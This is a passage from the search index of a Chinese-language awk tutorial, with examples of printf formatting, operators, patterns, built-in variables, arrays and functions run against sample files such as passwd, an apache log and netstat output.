uid:%d\\n\",$1,$3}' pass [root@shell shelldoc]# awk -F: '{printf \"username:%-10s uid:%d\\n\",$1,$3}' pass [root@shell shelldoc]# awk -F: '{printf \"%s%s\",$1,$3}' pass root0bin1daemon2adm3lp4sync5shutdown6halt7mail8uucp10 \u5bf9\u4e8e%f %7.2f \u663e\u793a\u5bbd\u5ea6\u4e3a7\uff0c\u4fdd\u75592\u4f4d\u5c0f\u6570 %-7.2f \u5de6\u5bf9\u9f50\uff0c\u663e\u793a\u5bbd\u5ea6\u4e3a7\uff0c\u4fdd\u75592\u4f4d\u5c0f\u6570 %.2f \u4fdd\u75592\u4f4d\u5c0f\u6570 [root@shell shelldoc]# echo \"12.345 23.56\" 12.345 23.56 [root@shell shelldoc]# echo \"12.345 23.56\" | awk '{printf \"%d %d\\n\",$1,$2}' //\u53d6\u6574\u4e0d\u56db\u820d\u4e94\u5165 12 23 [root@shell shelldoc]# echo \"12.345 23.56\" | awk '{printf \"%-6.2f%.1f\\n\",$1,$2}' //\u53d6\u5c0f\u6570\u65f6\u5019\u56db\u820d\u4e94\u5165 12.35 23.6 \u200b","title":"2\uff09printf"},{"location":"programming_language/awk/awk/#awk_3","text":"","title":"\u4e09\u3001awk\u7684\u8fd0\u7b97\u7b26"},{"location":"programming_language/awk/awk/#1_1","text":"-x \uff1a\u8d1f\u6570 (+)x \uff1a\u6b63\u6570 + - * / % \uff1a\u53d6\u6a21 ^ \uff1a\u53d6\u5e42 [root@shell shelldoc]# awk '{print $3,$5,$3+$5,$3-$5,$3*$5,$5/$3,$5%$3,2^16}' employees","title":"1\u3001\u7b97\u6570\u8fd0\u7b97\u7b26"},{"location":"programming_language/awk/awk/#2_1","text":"","title":"2\u3001\u5173\u7cfb\u8fd0\u7b97\u7b26"},{"location":"programming_language/awk/awk/#1_2","text":"< >= <= == != \u6253\u5370passwd\u6587\u4ef6\u4e2duid\u5c0f\u4e8e5\u7684\u884c [root@shell shelldoc]# awk -F: '$3<5{print}' /etc/passwd [root@shell shelldoc]# awk -F: '$3<5' /etc/passwd //\u6709\u5b9a\u5740\uff0c\u65e0\u52a8\u4f5c\uff0c\u9ed8\u8ba4\u5c31\u662f\u6253\u5370\u7b26\u5408\u6761\u4ef6\u7684\u884c \u6253\u5370\u7cfb\u7edf\u4e2dgid\u5927\u4e8e\u7b49\u4e8e500\u7684\u7ec4\u540d\u548cgid [root@shell shelldoc]# awk -F: '$3>=500{print $1,$3}' /etc/group","title":"1\uff09\u6570\u503c\u4e4b\u95f4\u7684\u5173\u7cfb\u8fd0\u7b97\u7b26"},{"location":"programming_language/awk/awk/#2_2","text":"== != \u6253\u5370\u7528\u6237\u540d\u662fbin\u7684\u884c [root@shell shelldoc]# awk -F: '$1==\"bin\"' pass bin:x:1:1:bin:/bin:/sbin/nologin \u6253\u5370\u7528\u6237\u540d\u4e0d\u662fbin\u7684\u884c [root@shell shelldoc]# awk -F: '$1!=\"bin\"' pass x ~ /y/ \u5339\u914d\u6b63\u5219 x !~ /y/ \u4e0d\u5339\u914d\u7684 \u6253\u5370pass\u6587\u4ef6\u4e2d\u540d\u5b57\u4e2d\u5e26o\u7684\u7528\u6237\u540d [root@shell shelldoc]# awk -F: '$1~/o/{print $1}' pass root daemon shutdown \u6253\u5370pass\u6587\u4ef6\u4e2d\u540d\u5b57\u4ee5ro\u5f00\u5934\u7684\u7528\u6237\u540d [root@shell shelldoc]# awk -F: '$1~/^ro/{print $1}' pass root","title":"2\uff09\u5b57\u7b26\u4e32\u4e4b\u95f4\u7684\u5173\u7cfb\u8fd0\u7b97"},{"location":"programming_language/awk/awk/#3_1","text":"\u200b && || ! uid\u5927\u4e8e8\u6216\u8005uid\u5c0f\u4e8e3\u7684\u7528\u6237\u7684\u540d\u5b57\u548cuid [root@shell shelldoc]# awk -F: '$3>8 || $3<3 {print $1,$3}' pass root 0 bin 1 daemon 2 uucp 10 1\uff09\u6253\u5370/etc/fstab\u4e2d\u542b\u6709boot\u7684\u884c [root@shell shelldoc]# awk '/boot/' /etc/fstab UUID=ab73b6db-6cfd-43dd-af99-9848973c7689 /boot ext4 defaults 1 2 [root@shell shelldoc]# awk '/boot/{print}' /etc/fstab UUID=ab73b6db-6cfd-43dd-af99-9848973c7689 /boot ext4 defaults 1 2 [root@shell shelldoc]# awk '/boot/{print $0}' /etc/fstab UUID=ab73b6db-6cfd-43dd-af99-9848973c7689 /boot ext4 defaults 1 2 2\uff09\u6253\u5370pass\u6587\u4ef6\u4e2duid\u57285\u52308\u4e4b\u95f4\u7684\u7528\u6237\u7684\u7528\u6237\u540d\u548cuid [root@shell shelldoc]# awk -F: '$3>=5 && $3<=8{print $1,$3}' pass 3\uff09\u6253\u5370passwd\u6587\u4ef6\u4e2duid\u4e3a10\u7684\u4eba\u7684\u7528\u6237\u540d\uff0cuid\u3001\u5bb6\u76ee\u5f55\u53cashell '$3==10{print $1,$3,$6,$7}' 4\uff09\u6253\u5370\u7528\u6237shell\u662f\u767b\u5f55shell\u7684\u7528\u6237\u540d\u53ca\u5176shell '/sh$/{print $1,$7}' '$7 ~ /sh$/{print $1,$7}' 5\uff09\u6253\u5370uid\u4e0d\u5927\u4e8e5\u7684\u7528\u6237\u540d '!($3>5){print $1}' [root@shell shelldoc]# awk -F: '!($3>5){print $1}' pass \u6ce8\u610f\uff1a\u62ec\u53f7\u6539\u53d8\u8fd0\u7b97\u7684\u4f18\u5148\u7ea7 6\uff09\u4f7f\u7528awk\u4ea4\u6362\u8f93\u51fapass\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u548c\u7b2c\u4e8c\u4e2a\u5b57\u6bb5(\u5176\u4ed6\u5b57\u6bb5\u6b63\u5e38\u8f93\u51fa) [root@shell shelldoc]# awk -F: '{print $2\":\"$1\":\"$3\":\"$4\":\"$5\":\"$6\":\"$7}' pass 7\uff09\u6253\u5370uid\u548cgid\u4e0d\u76f8\u540c\u7684\u7528\u6237\u7684\u7528\u6237\u540d\u3001uid\u548cgid '$3!=$4{print $1,$3,$4}' 8\uff09\u6253\u5370100\u4ee5\u5185\u80fd\u591f\u88ab7\u6574\u9664\uff0c\u53ca\u5305\u542b7\u7684\u6570 \uff08\u9762\u8bd5\u9898\uff09 [root@shell shelldoc]# seq 100 | awk '$1%7==0 || $1 ~ /7/' [root@shell shelldoc]# seq 100 | awk '$1%7==0 || /7/' [root@shell shelldoc]# seq 100 | awk '$0%7==0 || $0 ~ /7/' [root@shell shelldoc]# seq 100 | awk '$0%7==0 || /7/' \u200b","title":"3\u3001\u903b\u8f91\u8fd0\u7b97\u7b26"},{"location":"programming_language/awk/awk/#4_1","text":"","title":"4\u3001\u8d4b\u503c\u8fd0\u7b97\u7b26"},{"location":"programming_language/awk/awk/#awk_4","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cawk\u4e0d\u652f\u6301\u884c\u53f7\u5b9a\u5740 \u5e38\u89c1\u7684\u6a21\u5f0f","title":"\u56db\u3001awk\u7684\u6a21\u5f0f\u5339\u914d\uff08\u5b9a\u5740\uff09"},{"location":"programming_language/awk/awk/#1_3","text":"[root@shell shelldoc]# awk '{print}' pass","title":"1\u3001\u7a7a\u6a21\u5f0f \uff1a\u6bcf\u884c\u90fd\u505a\u52a8\u4f5c\u7684\u6a21\u5f0f"},{"location":"programming_language/awk/awk/#2_3","text":"\u5355\u4e00\u7684\u6b63\u5219 [root@shell shelldoc]# awk '/^root/{print}' pass \u8303\u56f4\u5b9a\u5740 [root@shell shelldoc]# awk '/^root/,/login$/{print}' pass root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin","title":"2\u3001\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"programming_language/awk/awk/#3_2","text":"\u200b $3 < 10 \u200b $1 ~ /7/","title":"3\u3001\u8868\u8fbe\u5f0f"},{"location":"programming_language/awk/awk/#4_2","text":"\u200b BEGIN{} \u8bfb\u53d6\u6587\u4ef6\u4e4b\u524d\u505a\uff0c\u53ea\u505a\u4e00\u6b21 \u200b END{} \u8bfb\u53d6\u4e86\u6240\u6709\u6587\u4ef6\u5185\u5bb9\u4e4b\u540e\u624d\u505a\uff0c\u53ea\u505a\u4e00\u6b21","title":"4\u3001\u7279\u6b8a\u6a21\u5f0f"},{"location":"programming_language/awk/awk/#5nr","text":"\u200b Number of Record \u53ef\u4ee5\u4ee3\u66ff\u884c\u53f7\u7684\u53d8\u91cf [root@shell shelldoc]# awk '2{print}' pass //\u53cd\u4f8b [root@shell shelldoc]# awk 'NR==2{print}' pass //\u6253\u5370\u7b2c2\u884c bin:x:1:1:bin:/bin:/sbin/nologin \u200b \u6253\u5370\u5947\u6570\u884c [root@shell shelldoc]# awk 'NR%2==1' pass \u200b \u6253\u5370\u5076\u6570\u884c [root@shell shelldoc]# awk 'NR%2==0' pass \u200b \u4ece\u7b2c\u4e00\u884c\u5f00\u59cb\uff0c\u6bcf3\u884c\u6253\u5370\u4e00\u6b21 [root@shell shelldoc]# awk 'NR%3==1' pass \u200b \u200b \u200b","title":"5\u3001NR\u53d8\u91cf"},{"location":"programming_language/awk/awk/#awk_5","text":"","title":"\u4e94\u3001awk\u7684\u5185\u7f6e\u53d8\u91cf"},{"location":"programming_language/awk/awk/#nr","text":"Number of Record \u53ef\u4ee5\u4ee3\u66ff\u884c\u53f7\u7684\u53d8\u91cf [root@shell shelldoc]# awk '2{print}' pass //\u53cd\u4f8b [root@shell shelldoc]# awk 'NR==2{print}' pass //\u6253\u5370\u7b2c2\u884c bin:x:1:1:bin:/bin:/sbin/nologin \u6253\u5370\u5947\u6570\u884c [root@shell shelldoc]# awk 'NR%2==1' pass \u6253\u5370\u5076\u6570\u884c [root@shell shelldoc]# awk 'NR%2==0' pass \u4ece\u7b2c\u4e00\u884c\u5f00\u59cb\uff0c\u6bcf3\u884c\u6253\u5370\u4e00\u6b21 [root@shell shelldoc]# awk 'NR%3==1' pass","title":"NR\u53d8\u91cf"},{"location":"programming_language/awk/awk/#nf","text":"[root@iZm5e4bxrlofss5j30ztx2Z ~]# awk -F: '{print $NF}' passwd /bin/bash /sbin/nologin","title":"NF\u53d8\u91cf \u4ee3\u8868\u5217\u6570"},{"location":"programming_language/awk/awk/#fs","text":"[root@iZm5e4bxrlofss5j30ztx2Z ~]# awk 'BEGIN{FS=\"[:\\t]\"} {print $1}' passwd root bin","title":"FS\u53d8\u91cf \u4ee3\u8868\u5206\u9694\u7b26"},{"location":"programming_language/awk/awk/#ofs","text":"[root@iZm5e4bxrlofss5j30ztx2Z ~]# awk 'BEGIN{FS=\"[:\\t]\";OFS=\"@\"} {print $1,$2}' passwd root@x bin@x","title":"OFS\u53d8\u91cf \u8f93\u51fa\u5206\u5272\u7b26\u53f7"},{"location":"programming_language/awk/awk/#rsrecord-separator","text":"\u4e00\u822c\u662f\\n [root@iZm5e4bxrlofss5j30ztx2Z ~]# echo a b oo c d |awk 'BEGIN{RS=\"oo\"} {print $1,$2}' \\\\oo\u7528\u6765\u533a\u5206\u8bb0\u5f55 a b c d","title":"RS\uff1aRecord Separator\uff0c\u8bb0\u5f55\u5206\u9694\u7b26"},{"location":"programming_language/awk/awk/#orsoutput-record-separate","text":"\u4e00\u822c\u662f\\n [root@iZm5e4bxrlofss5j30ztx2Z ~]# echo a b oo c d |awk 'BEGIN{ ORS=\"PP\"} {print $1,$2}' a bPP[root@iZm5e4bxrlofss5j30ztx2Z ~]#","title":"ORS\uff1aOutput Record Separate\uff0c\u8f93\u51fa\u5f53\u524d\u8bb0\u5f55\u5206\u9694\u7b26"},{"location":"programming_language/awk/awk/#argv","text":"ARGC\u4ee3\u8868\u547d\u4ee4\u884c\u7b2c\u51e0\u4e2a [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt 1 2 3 4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{for(x=0;x<=ARGC;x++)print x,ARGC,ARGV[x]}' 1.txt 88 99 0 4 awk 1 4 1.txt 2 4 88 3 4 99 4 4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{for(x=1;x<=ARGC;x++)print x,ARGC,ARGV[x]}' 1.txt 88 99 1 4 1.txt 2 4 88 3 4 99 4 4","title":"ARGV \u547d\u4ee4\u884c\u53c2\u6570"},{"location":"programming_language/awk/awk/#environ","text":"[root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{for(env in ENVIRON)print env,ENVIRON[env]}' AWKPATH .:/usr/share/awk LANG en_US.UTF-8 HISTSIZE 1000 XDG_RUNTIME_DIR /run/user/0 USER root \u6216\u8005\u76f4\u63a5\u8bbf\u95ee\u67d0\u4e2a\u53d8\u91cf [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print ENVIRON[\"HOSTNAME\"]}' 1.txt iZbp1ealzv6zqhd71bns8sZ","title":"ENVIRON \u73af\u5883\u53d8\u91cf"},{"location":"programming_language/awk/awk/#awk_6","text":"[root@iZm5e4bxrlofss5j30ztx2Z ~]# echo a b c d | awk 'BEGIN{one=1;two=2}{print $(one + two)}' c","title":"awk\u7684\u53d8\u91cf"},{"location":"programming_language/awk/awk/#_2","text":"[root@iZbp1ealzv6zqhd71bns8sZ ~]# cat my_flask.py |awk '{print $0;exit 5}' # -*- coding: utf-8 -* [root@iZbp1ealzv6zqhd71bns8sZ ~]# echo $? 5 [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat my_flask.py |awk 'NR==1{print $0}END{exit 6}' # -*- coding: utf-8 -* [root@iZbp1ealzv6zqhd71bns8sZ ~]# echo $? 6 [root@iZbp1ealzv6zqhd71bns8sZ ~]# \u200b \u200b \u200b","title":"\u8bbe\u7f6e\u9000\u51fa\u7801"},{"location":"programming_language/awk/awk_array/","text":"\u6570\u7ec4 \u6570\u7ec4\u662f\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u540d \u6765\u4fdd\u5b58\u4e00\u7ec4\u6570\u636e\uff0c\u901a\u5e38\u8fd9\u4e9b\u6570\u636e\u7684\u7c7b\u578b\u662f\u4e00\u6837\u7684 \u6570\u7ec4\u4e2d\u7684\u6570\u636e(\u5143\u7d20) \u662f\u4e0e\u6570\u7ec4\u4e0b\u6807\u4e00\u4e00\u5bf9\u5e94\u7684 \u5982\u679c\u60f3\u8981\u53d6\u51fa\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\uff0c\u5c31\u4f1a\u4f7f\u7528\u5230\u6570\u7ec4\u540d\u548c\u4e0b\u6807 awk\u4e2d\u7684\u6570\u7ec4\u4e5f\u6210\u4e3a\u5173\u8054\u6570\u7ec4\uff0c\u662f\u56e0\u4e3a\u5b83\u7684\u4e0b\u6807\u53ef\u4ee5\u662f\u6570\u503c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32 \u4e00\u3001\u6570\u7ec4\u7684\u5b9a\u4e49 \u6570\u7ec4\u540d[\u4e0b\u6807]=\u503c \u4e8c\u3001\u6570\u7ec4\u7684\u904d\u5386 for\u5faa\u73af\u904d\u5386\u6570\u7ec4 \u8bed\u6cd5\uff1a \u200b 1\uff09for (i=0;i<NR;i++) \u200b 2\uff09 for (\u4e0b\u6807 in \u6570\u7ec4\u540d) {print \u6570\u7ec4\u540d[\u4e0b\u6807]} \u5b9a\u4e49\u6570\u7ec4\u53ca\u7ed9\u6570\u7ec4\u4e2d\u5143\u7d20\u8d4b\u503c [root@shell shelldoc]# arr.awk BEGIN{ a[1]=\"aa\" a[2]=\"bb\" a[3]=\"cc\" for(i=1;i<=3;i++) { print a[i] } } [root@shell shelldoc]# awk -f arr.awk aa bb cc \u5220\u9664\u6570\u7ec4\u5143\u7d20 awk\u652f\u6301\u7684\u4e0b\u6807\u7684\u7c7b\u578b 1\uff09\u4f7f\u7528\u6570\u5b57\u6216\u53d8\u91cf\u4f5c\u4e3a\u4e0b\u6807 name[1] name[x++] name[NR] [root@shell shelldoc]# awk '{name[x++]=$1}END{for(i=0;i<NR;i++){print i,name[i]}}' employees 0 Tom 1 Mary 2 Sally 3 Billy 4 Tom 2\uff09\u4f7f\u7528\u5b57\u7b26\u4e32\u505a\u4e0b\u6807 name[\"tom\"]++ [root@shell shelldoc]# datafile4 cat dog pig cat dog dog bird dog rabbit \u7edf\u8ba1\u6587\u4ef6\u4e2d\u6bcf\u79cd\u52a8\u7269\u6709\u51e0\u53ea\uff1f [root@shell shelldoc]# awk '{count[$1]++}END{for(i in count){print i,count[i]}}' datafile4 cat 2 bird 1 rabbit 1 dog 4 pig 1 \u7edf\u8ba1apache\u65e5\u5fd7\u4e2d\u6bcf\u4e2aIP\u7684\u8bbf\u95ee\u6b21\u6570\uff0c\u663e\u793a\u8bbf\u95ee\u6b21\u6570\u6700\u591a\u7684\u4e94\u4e2aIP\u53ca\u8bbf\u95ee\u6b21\u6570 /var/log/httpd/access_log [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{count[$1]++}END{for(i in count){print count[i],i}}' /var/log/httpd/access_log | sort -k1nr | head -n 10 \u7edf\u8ba1/root/.bash_history\u6587\u4ef6\u4e2d\u6267\u884c\u6b21\u6570\u6700\u591a\u7684\u5341\u6761\u547d\u4ee4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{count[$0]++}END{for(i in count){print count[i],i}}' /root/.bash_history | sort -k1nr | head -n 10 71 sh 4.sh 64 vim 4.sh 38 ll \u7edf\u8ba1\u7cfb\u7edf\u4e2d\u4f7f\u7528\u6bcf\u79cdshell\u7684\u6709\u51e0\u4e2a\u4eba\uff1f [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk -F: '{count[$NF]++}END{for(i in count){print count[i],i}}' /etc/passwd | sort -k1nr | head -n 10 18 /sbin/nologin 1 /bin/bash 1 /bin/sync 1 /sbin/halt 1 /sbin/shutdown \u7edf\u8ba1\u670d\u52a1\u5668\u4e0atcp\u8fde\u63a5\u60c5\u51b5(\u6bcf\u79cd\u76d1\u542c\u72b6\u6001\u6709\u51e0\u4e2a\uff1f) \u5982\uff1a LISTEN 10 ESTABLISHED 30 [root@iZbp1ealzv6zqhd71bns8sZ ~]# netstat -tan4p |grep -v Active| grep -v Proto| awk '{count[$6]++}END{for(i in count){print count[i],i}}' | sort -k1nr 5 ESTABLISHED 1 LISTEN \u200b","title":"\u6570\u7ec4"},{"location":"programming_language/awk/awk_array/#_1","text":"\u6570\u7ec4\u662f\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u540d \u6765\u4fdd\u5b58\u4e00\u7ec4\u6570\u636e\uff0c\u901a\u5e38\u8fd9\u4e9b\u6570\u636e\u7684\u7c7b\u578b\u662f\u4e00\u6837\u7684 \u6570\u7ec4\u4e2d\u7684\u6570\u636e(\u5143\u7d20) \u662f\u4e0e\u6570\u7ec4\u4e0b\u6807\u4e00\u4e00\u5bf9\u5e94\u7684 \u5982\u679c\u60f3\u8981\u53d6\u51fa\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\uff0c\u5c31\u4f1a\u4f7f\u7528\u5230\u6570\u7ec4\u540d\u548c\u4e0b\u6807 awk\u4e2d\u7684\u6570\u7ec4\u4e5f\u6210\u4e3a\u5173\u8054\u6570\u7ec4\uff0c\u662f\u56e0\u4e3a\u5b83\u7684\u4e0b\u6807\u53ef\u4ee5\u662f\u6570\u503c\uff0c\u4e5f\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32","title":"\u6570\u7ec4"},{"location":"programming_language/awk/awk_array/#_2","text":"\u6570\u7ec4\u540d[\u4e0b\u6807]=\u503c","title":"\u4e00\u3001\u6570\u7ec4\u7684\u5b9a\u4e49"},{"location":"programming_language/awk/awk_array/#_3","text":"","title":"\u4e8c\u3001\u6570\u7ec4\u7684\u904d\u5386"},{"location":"programming_language/awk/awk_array/#for","text":"\u8bed\u6cd5\uff1a \u200b 1\uff09for (i=0;i<NR;i++) \u200b 2\uff09 for (\u4e0b\u6807 in \u6570\u7ec4\u540d) {print \u6570\u7ec4\u540d[\u4e0b\u6807]} \u5b9a\u4e49\u6570\u7ec4\u53ca\u7ed9\u6570\u7ec4\u4e2d\u5143\u7d20\u8d4b\u503c [root@shell shelldoc]# arr.awk BEGIN{ a[1]=\"aa\" a[2]=\"bb\" a[3]=\"cc\" for(i=1;i<=3;i++) { print a[i] } } [root@shell shelldoc]# awk -f arr.awk aa bb cc","title":"for\u5faa\u73af\u904d\u5386\u6570\u7ec4"},{"location":"programming_language/awk/awk_array/#_4","text":"","title":"\u5220\u9664\u6570\u7ec4\u5143\u7d20"},{"location":"programming_language/awk/awk_array/#awk","text":"","title":"awk\u652f\u6301\u7684\u4e0b\u6807\u7684\u7c7b\u578b"},{"location":"programming_language/awk/awk_array/#1","text":"name[1] name[x++] name[NR] [root@shell shelldoc]# awk '{name[x++]=$1}END{for(i=0;i<NR;i++){print i,name[i]}}' employees 0 Tom 1 Mary 2 Sally 3 Billy 4 Tom","title":"1\uff09\u4f7f\u7528\u6570\u5b57\u6216\u53d8\u91cf\u4f5c\u4e3a\u4e0b\u6807"},{"location":"programming_language/awk/awk_array/#2","text":"name[\"tom\"]++ [root@shell shelldoc]# datafile4 cat dog pig cat dog dog bird dog rabbit \u7edf\u8ba1\u6587\u4ef6\u4e2d\u6bcf\u79cd\u52a8\u7269\u6709\u51e0\u53ea\uff1f [root@shell shelldoc]# awk '{count[$1]++}END{for(i in count){print i,count[i]}}' datafile4 cat 2 bird 1 rabbit 1 dog 4 pig 1 \u7edf\u8ba1apache\u65e5\u5fd7\u4e2d\u6bcf\u4e2aIP\u7684\u8bbf\u95ee\u6b21\u6570\uff0c\u663e\u793a\u8bbf\u95ee\u6b21\u6570\u6700\u591a\u7684\u4e94\u4e2aIP\u53ca\u8bbf\u95ee\u6b21\u6570 /var/log/httpd/access_log [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{count[$1]++}END{for(i in count){print count[i],i}}' /var/log/httpd/access_log | sort -k1nr | head -n 10 \u7edf\u8ba1/root/.bash_history\u6587\u4ef6\u4e2d\u6267\u884c\u6b21\u6570\u6700\u591a\u7684\u5341\u6761\u547d\u4ee4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{count[$0]++}END{for(i in count){print count[i],i}}' /root/.bash_history | sort -k1nr | head -n 10 71 sh 4.sh 64 vim 4.sh 38 ll \u7edf\u8ba1\u7cfb\u7edf\u4e2d\u4f7f\u7528\u6bcf\u79cdshell\u7684\u6709\u51e0\u4e2a\u4eba\uff1f [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk -F: '{count[$NF]++}END{for(i in count){print count[i],i}}' /etc/passwd | sort -k1nr | head -n 10 18 /sbin/nologin 1 /bin/bash 1 /bin/sync 1 /sbin/halt 1 /sbin/shutdown \u7edf\u8ba1\u670d\u52a1\u5668\u4e0atcp\u8fde\u63a5\u60c5\u51b5(\u6bcf\u79cd\u76d1\u542c\u72b6\u6001\u6709\u51e0\u4e2a\uff1f) \u5982\uff1a LISTEN 10 ESTABLISHED 30 [root@iZbp1ealzv6zqhd71bns8sZ ~]# netstat -tan4p |grep -v Active| grep -v Proto| awk '{count[$6]++}END{for(i in count){print count[i],i}}' | sort -k1nr 5 ESTABLISHED 1 LISTEN \u200b","title":"2\uff09\u4f7f\u7528\u5b57\u7b26\u4e32\u505a\u4e0b\u6807"},{"location":"programming_language/awk/awk_function/","text":"Awk\u51fd\u6570 \u4e00\u3001\u5185\u7f6e\u51fd\u6570 man awk //\u641c\u7d22Function 1\u3001\u67e5\u627e\u5e76\u66ff\u6362 sub(\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u66ff\u6362\u5b57\u7b26\u4e32) \u2014\u2014 \u67e5\u627e\u5e76\u66ff\u6362 [root@shell shelldoc]# awk '{sub(/NW/,\"NorthWest\");print}' datafile northwest NorthWest Charles Main 3.0 .98 3 34 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{sub(/a/,\"NorthWest\");print}' 1.txt NorthWest:9:0 b c d e f g:0:p h i j k l [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt a:9:0 b c d e f g:0:p h i j k l 2\u3001\u5927\u5c0f\u5199\u8f6c\u6362 tolower(\u5b57\u7b26\u4e32) \u2014\u2014 \u8f6c\u6362\u6210\u5c0f\u5199 toupper(\u5b57\u7b26\u4e32) \u2014\u2014 \u8f6c\u6362\u6210\u5927\u5199 [root@shell shelldoc]# awk '{print toupper($1)}' datafile [root@shell shelldoc]# awk '{print tolower($2)}' datafile 3\u3001\u67e5\u627e index(\u539f\u5b57\u7b26\u4e32\uff0c\u5b50\u4e32) \u2014\u2014 \u8f93\u51fa\u5b50\u4e32\u5728\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e [root@shell shelldoc]# awk '{print index($1,\"o\"),$1}' datafile 2 northwest 0 western 2 southwest 2 southern 2 southeast 0 eastern 2 northeast 0 western 2 north 0 central 4\u3001len length(\u5b57\u7b26\u4e32) \u2014\u2014 \u663e\u793a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6 [root@shell shelldoc]# awk '{print length($1),$1}' datafile 9 northwest 7 western 9 southwest 8 southern 9 southeast 7 eastern 9 northeast 7 western 5 north 7 central 5\u3001split [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt a:9:0 b c d e f g:0:p h i j k l [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{z=split($1,array,\":\");for(i=1;i<=z;i++){print i,array[i]}}' 1.txt 1 a 2 9 3 0 1 g 2 0 3 p 6\u3001\u5176\u4ed6\u90e8\u5206\u51fd\u6570 7\u3001\u968f\u673a\u51fd\u6570 rand() \u6bcf\u6b21\u4f7f\u7528\u7684\u65f6\u5019 \u5fc5\u987b\u8c03\u7528srand()\u51fd\u6570\uff0crand()\u624d\u4f1a\u968f\u673a\uff0c\u4e0d\u7136\u5c31\u4e00\u76f4\u90fd\u662f\u4e00\u4e2a [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print srand(),rand()}' 1.txt 1 0.024876 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print srand(),rand()}' 1.txt 1 0.024876 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print srand(),rand()}' 1.txt 1 0.732423 \u4e0d\u8c03\u7528srand [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print rand()}' 1.txt 0.237788 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print rand()}' 1.txt 0.237788 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'END{print rand()}' 1.txt 0.237788 8\u3001getline\u51fd\u6570 \u5f53getline\u5927\u4e8e0\u4ee3\u8868\u8bfb\u53d6\u5230\u4e86\u4e0b\u4e00\u884c [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt a:9:0 b c d e f g:0:p h i j k l [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '/g:0:p/{if(getline>0){print \"have\"}else{print \"GG\"}}' 1.txt GG 9\u3001system()\u51fd\u6570 \u200b \u53ef\u4ee5\u6267\u884c\u4e00\u4e2a\u7cfb\u7edf\u547d\u4ee4 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{if(system(\"mkdir dale\")!=0){print \"faile\"}else{print \"ok\"}}' 1.txt ok [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk 'BEGIN{if(system(\"mkdir dale\")!=0){print \"faile\"}else{print \"ok\"}}' 1.txt mkdir: cannot create directory \u2018dale\u2019: File exists faile 10\u3001\u65f6\u95f4\u51fd\u6570 \u4e8c\u3001\u81ea\u5b9a\u4e49\u51fd\u6570 \u683c\u5f0f function \u51fd\u6570\u540d(\u53c2\u65701\uff0c\u53c2\u65702\uff0c... ... \uff0c\u53c2\u6570n) { \u51fd\u6570\u4f53 return value //\u8fd4\u56de\u503c } //\u53c2\u6570\u4e5f\u662f\u53ef\u6709\u53ef\u65e0\u7684 [root@shell shelldoc]# awk 'function hello(){print \"shell is over\"}{hello()}' pass","title":"\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#awk","text":"","title":"Awk\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#_1","text":"man awk //\u641c\u7d22Function","title":"\u4e00\u3001\u5185\u7f6e\u51fd\u6570"},{"location":"programming_language/awk/awk_function/#1","text":"sub(\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u66ff\u6362\u5b57\u7b26\u4e32) \u2014\u2014 \u67e5\u627e\u5e76\u66ff\u6362 [root@shell shelldoc]# awk '{sub(/NW/,\"NorthWest\");print}' datafile northwest NorthWest Charles Main 3.0 .98 3 34 [root@iZbp1ealzv6zqhd71bns8sZ ~]# awk '{sub(/a/,\"NorthWest\");print}' 1.txt NorthWest:9:0 b c d e f g:0:p h i j k l [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat 1.txt a:9:0 b c d e f g:0:p h i j k l","title":"1\u3001\u67e5\u627e\u5e76\u66ff\u6362"},{"location":"programming_language/awk/awk_function/#2","text":"tolower(\u5b57\u7b26\u4e32) \u2014\u2014 \u8f6c\u6362\u6210\u5c0f\u5199 toupper(\u5b57\u7b26\u4e32) \u2014\u2014 \u8f6c\u6362\u6210\u5927\u5199 [root@shell shelldoc]# awk '{print toupper($1)}' datafile [root@shell shelldoc]# awk '{print tolower($2)}' datafile","title":"2\u3001\u5927\u5c0f\u5199\u8f6c\u6362"},{"location":"programming_language/awk/awk_function/#3","text":"index(\u539f\u5b57\u7b26\u4e32\uff0c\u5b50\u4e32) \u2014\u2014 